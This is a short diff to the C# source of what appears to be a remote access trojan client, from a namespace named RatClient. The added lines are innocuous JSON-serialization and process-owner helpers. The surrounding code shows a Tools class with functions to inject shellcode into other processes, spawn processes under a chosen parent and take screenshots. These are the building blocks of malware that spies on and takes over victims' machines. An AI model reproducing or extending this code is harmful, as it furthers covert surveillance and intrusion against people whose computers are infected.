@@ -9,6 +9,7 @@ using System.Runtime.InteropServices;
 using RatClient.Mtool;
 using System.Management;
 using System.Security.Principal;
+using System.Runtime.Serialization.Json;
 
 
 
@@ -60,6 +61,7 @@ public class Tools
         }
         return NativeMethods.SpawnSystem(parentID, appName, arguments) == 0;
     }
+
     public static bool InjectProcess(byte[] shellCode, int procid= -1, string name = null)
     {
         if (procid==-1 && name == null)
@@ -100,6 +102,7 @@ public class Tools
         Marshal.Copy(ptr, resolution, 0, 2);
         return new int[2] { resolution[0], resolution[1] };
     }
+
     public static byte[] ScreenShot(bool Compresed = false)
     {
         int w = Info.Resoulution.Width;
@@ -200,5 +203,27 @@ public class Tools
             }
         }
         return null;
+    }
+
+    public static string GetOwnerByPid(uint processId)
+    {
+        NativeMethods.GetUserNameByPid(processId, out IntPtr buffer);
+        string result = Marshal.PtrToStringUni(buffer);
+        Marshal.FreeHGlobal(buffer);
+        if (result != null && result.Length > 0) 
+        {
+            return result;
+        }
+        return "Unknow";
+    }
+
+    public static byte[] SerializeToJson<T>(T obj)
+    {
+        using (MemoryStream ms = new MemoryStream())
+        {
+            DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(T));
+            serializer.WriteObject(ms, obj);
+            return ms.ToArray();
+        }
     }
 }
